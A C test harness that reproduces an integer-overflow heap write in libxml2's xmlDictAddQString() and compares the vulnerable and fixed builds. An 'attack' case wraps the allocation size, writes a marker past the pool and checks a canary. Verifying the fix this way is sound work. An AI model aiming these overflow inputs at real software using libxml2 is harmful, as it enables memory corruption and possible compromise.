/*
 * Harness for CVE-2026-86138: xmlDictAddQString() unsigned overflow.
 *
 * The pinned function is included verbatim from pins/dict-vulnerable.inc
 * (libxml2 v2.15.3 dict.c lines 196-245) or pins/dict-fixed.inc
 * (v2.15.4 dict.c lines 196-256, byte-identical to master).
 * Surrounding types, allocator and caller are stand-ins.
 *
 * Cases:
 *   attack  plen=15,    namelen=0xfffffff0 -> 32-bit sum+1 wraps to 0
 *   wrap1k  plen=1000,  namelen=0xffffffff -> 32-bit sum+1 wraps to 1000
 *   safe    plen=15,    namelen=16         -> no wrap
 *
 * Build: -DVARIANT_FIXED selects the fixed body; -DPLAIN_MODE adds the
 * interior pool + canary + SIGSEGV readback (vulnerable build only).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <unistd.h>

typedef unsigned char xmlChar;

#ifndef SIZE_MAX
#define SIZE_MAX ((size_t) -1)
#endif

typedef struct _xmlDictStrings xmlDictStrings;
typedef xmlDictStrings *xmlDictStringsPtr;
struct _xmlDictStrings {
    xmlDictStringsPtr next;
    xmlChar *free;
    xmlChar *end;
    size_t size;
    size_t nbStrings;
    xmlChar array[1];
};

typedef struct _xmlDict xmlDict;
typedef xmlDict *xmlDictPtr;
struct _xmlDict {
    int ref_counter;
    void *table;
    size_t size;
    unsigned int nbElems;
    xmlDictStringsPtr strings;
    struct _xmlDict *subdict;
    unsigned seed;
    size_t limit;
};

/* Stand-in allocator. The cap simulates a constrained consumer so the fixed
 * build's corrected ~17 GiB allocation fails cleanly instead of being served
 * by Linux overcommit. The vulnerable build allocates only POOL_BYTES. */
#define ALLOC_CAP (1024UL * 1024UL * 1024UL)
#define POOL_BYTES (sizeof(xmlDictStrings) + 1000)
static unsigned char *g_arena;
static void *xmlMalloc(size_t n) {
    if (n > ALLOC_CAP) return NULL;
#ifdef PLAIN_MODE
    /* Interior allocation: known 64-byte canary immediately after the pool. */
    if (g_arena != NULL && n <= POOL_BYTES) {
        memset(g_arena, 0, POOL_BYTES + 64);
        memset(g_arena + POOL_BYTES, 0x5a, 64);
        return g_arena;
    }
#endif
    return malloc(n);
}

#ifdef VARIANT_FIXED
#include "../pins/dict-fixed.inc"
#define VARIANT "fixed"
#else
#include "../pins/dict-vulnerable.inc"
#define VARIANT "vulnerable"
#endif

#ifdef PLAIN_MODE
static sigjmp_buf g_jmp;
static void segv_handler(int sig) {
    (void) sig;
    siglongjmp(g_jmp, 1);
}
#endif

#define SRC_LEN 0x100000000ULL   /* 2^32 bytes, sparse anonymous mapping */

int main(int argc, char **argv) {
    const char *cas = (argc > 1) ? argv[1] : "attack";
    unsigned int plen;
    unsigned int namelen;
    unsigned int wrapped;
    unsigned char *src;
    xmlDict dict;
    const xmlChar *ret;
    unsigned char prefix[1100];

    memset(&dict, 0, sizeof(dict));
    dict.strings = NULL;
    dict.limit = 0;

    if (strcmp(cas, "wrap1k") == 0) {
        plen = 1000; namelen = 0xffffffffU;
    } else if (strcmp(cas, "safe") == 0) {
        plen = 15; namelen = 16;
    } else {
        cas = "attack"; plen = 15; namelen = 0xfffffff0U;
    }
    wrapped = namelen + plen + 1;
    printf("VARIANT=%s CASE=%s PLEN=%u NAMELEN=%u WRAPPED=%u POOL_BYTES=%zu\n",
           VARIANT, cas, plen, namelen, wrapped, (size_t) POOL_BYTES);

    /* Sparse 2^32 read-only source: anonymous zero pages cost no resident
     * memory. The chosen pattern sits at the source index that the name
     * memcpy writes to the first byte past the pool. */
    src = (unsigned char *) mmap(NULL, (size_t) SRC_LEN,
                                 PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (src == MAP_FAILED) { perror("mmap"); return 2; }
    memcpy(src, "abcdefghijklmno", 15);
    memcpy(prefix, "abcdefghijklmno", 15);
    if (plen > 15) memset(prefix + 15, 'p', plen - 15);
    if (plen < POOL_BYTES - offsetof(xmlDictStrings, array) - 1) {
        memcpy(src + (POOL_BYTES - offsetof(xmlDictStrings, array) - plen - 1),
               "MISHE-LIBXML2!!", 15);
    }
    if (mprotect(src, (size_t) SRC_LEN, PROT_READ) != 0) {
        perror("mprotect"); return 2;
    }

#ifdef PLAIN_MODE
    g_arena = (unsigned char *) malloc(POOL_BYTES + 64);
    if (g_arena == NULL) return 2;
    signal(SIGSEGV, segv_handler);
    if (sigsetjmp(g_jmp, 1) == 0) {
        ret = xmlDictAddQString(&dict, prefix, plen, src, namelen);
        printf("RET=%p NO_FAULT=1\n", (void *) ret);
    } else {
        printf("SIGSEGV_CAUGHT=1\n");
        printf("CANARY_AFTER=%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",
               g_arena[POOL_BYTES], g_arena[POOL_BYTES + 1],
               g_arena[POOL_BYTES + 2], g_arena[POOL_BYTES + 3],
               g_arena[POOL_BYTES + 4], g_arena[POOL_BYTES + 5],
               g_arena[POOL_BYTES + 6], g_arena[POOL_BYTES + 7],
               g_arena[POOL_BYTES + 8], g_arena[POOL_BYTES + 9],
               g_arena[POOL_BYTES + 10], g_arena[POOL_BYTES + 11],
               g_arena[POOL_BYTES + 12], g_arena[POOL_BYTES + 13],
               g_arena[POOL_BYTES + 14], g_arena[POOL_BYTES + 15]);
    }
#else
    ret = xmlDictAddQString(&dict, prefix, plen, src, namelen);
    printf("RET=%s\n", ret == NULL ? "NULL" : "non-NULL");
#endif
    fflush(stdout);
    return 0;
}
